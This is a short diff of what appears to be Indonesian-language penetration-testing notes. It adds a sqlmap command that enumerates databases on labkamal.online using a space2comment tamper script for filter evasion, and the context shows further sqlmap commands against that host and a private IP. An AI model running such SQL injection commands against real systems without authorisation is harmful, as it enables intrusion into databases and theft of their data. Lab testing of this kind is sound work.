@@ -200,6 +200,11 @@ sqlmap -u "http://labkamal.online:8085/search.php?q=test" \
   --batch
 ```
 
+Perlu menaikkan temper dan level:
+```
+sqlmap -u "http://labkamal.online:8096/search.php?q=a" --dbs --tamper=space2comment --level=2 --batch
+```
+
 Flush session lama untuk target ini
 ```
 sqlmap -u "http://192.168.32.122:8000/news/detail?id=1" --flush-session
